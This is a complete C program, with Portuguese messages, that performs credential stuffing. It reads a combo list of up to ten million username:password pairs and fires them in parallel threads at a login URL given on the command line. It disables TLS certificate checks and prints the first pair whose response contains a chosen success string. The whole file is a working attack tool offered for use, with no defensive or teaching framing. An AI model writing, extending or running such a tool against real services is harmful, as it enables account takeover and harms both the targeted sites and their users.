#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <stdatomic.h>

#define MAX_LINES 10000000
#define MAX_LINE_LEN 1024
#define MAX_THREADS 100

char **combos;
int num_combos = 0;
char *url;
char *success_str;
char *error_str;
int thread_count = 10;
atomic_int found = 0;
pthread_mutex_t print_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t queue_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    char *memory;
    size_t size;
} MemoryStruct;

void *xmalloc(size_t size) {
    void *p = malloc(size);
    if (!p) {
        perror("malloc");
        exit(1);
    }
    return p;
}

void carregar_combos(const char *arquivo) {
    FILE *fp = fopen(arquivo, "r");
    if (!fp) {
        perror("Erro abrindo arquivo de combinações");
        exit(1);
    }

    combos = xmalloc(MAX_LINES * sizeof(char *));
    char linha[MAX_LINE_LEN];
    while (fgets(linha, sizeof(linha), fp)) {
        linha[strcspn(linha, "\n")] = 0;
        combos[num_combos++] = strdup(linha);
        if (num_combos >= MAX_LINES) {
            fprintf(stderr, "Limite máximo de combos atingido (%d)\n", MAX_LINES);
            break;
        }
    }
    fclose(fp);
}

size_t escrever_resposta(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    MemoryStruct *mem = (MemoryStruct *)userdata;

    char *tmp = realloc(mem->memory, mem->size + total + 1);
    if (!tmp) return 0;
    mem->memory = tmp;

    memcpy(&(mem->memory[mem->size]), ptr, total);
    mem->size += total;
    mem->memory[mem->size] = '\0';

    return total;
}

int testar_credencial(const char *combo) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char usuario[512], senha[512];
    if (sscanf(combo, "%[^:]:%511s", usuario, senha) != 2) {
        curl_easy_cleanup(curl);
        return 0;
    }

    char post_data[1024];
    snprintf(post_data, sizeof(post_data), "username=%s&password=%s", usuario, senha);

    MemoryStruct chunk = {.memory = xmalloc(1), .size = 0};

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, escrever_resposta);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    CURLcode res = curl_easy_perform(curl);
    int sucesso = 0;

    if (res == CURLE_OK) {
        if (strstr(chunk.memory, success_str) &&
           (!error_str || !strstr(chunk.memory, error_str))) {
            sucesso = 1;
        }
    }

    curl_easy_cleanup(curl);
    free(chunk.memory);
    return sucesso;
}

typedef struct {
    int index;
} Queue;

Queue queue = {0};

int get_next_index() {
    int idx = -1;
    pthread_mutex_lock(&queue_mutex);
    if (queue.index < num_combos && !atomic_load(&found)) {
        idx = queue.index;
        queue.index++;
    }
    pthread_mutex_unlock(&queue_mutex);
    return idx;
}

void *thread_func(void *arg) {
    (void)arg;

    while (1) {
        if (atomic_load(&found)) break;

        int idx = get_next_index();
        if (idx == -1) break;

        if (testar_credencial(combos[idx])) {
            pthread_mutex_lock(&print_mutex);
            if (!atomic_load(&found)) {
                atomic_store(&found, 1);
                printf("\033[1;32m[✓] SUCESSO:\033[0m %s\n", combos[idx]);
            }
            pthread_mutex_unlock(&print_mutex);
            break;
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5 || argc > 6) {
        printf("Uso: %s <url> <arquivo_combo> <success_str> <threads> [<error_str> opcional]\n", argv[0]);
        return 1;
    }

    url = argv[1];
    char *arquivo_combo = argv[2];
    success_str = argv[3];
    thread_count = atoi(argv[4]);
    if (thread_count < 1) thread_count = 1;
    if (thread_count > MAX_THREADS) thread_count = MAX_THREADS;
    error_str = (argc == 6) ? argv[5] : NULL;

    curl_global_init(CURL_GLOBAL_ALL);
    carregar_combos(arquivo_combo);

    pthread_t threads[MAX_THREADS];

    for (int i = 0; i < thread_count; i++) {
        int rc = pthread_create(&threads[i], NULL, thread_func, NULL);
        if (rc != 0) {
            fprintf(stderr, "Erro ao criar thread %d: %s\n", i, strerror(rc));
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    if (!atomic_load(&found)) {
        printf("\033[1;31m[x] Nenhuma combinação funcionou.\033[0m\n");
    }

    for (int i = 0; i < num_combos; i++) {
        free(combos[i]);
    }
    free(combos);

    curl_global_cleanup();
    return 0;
}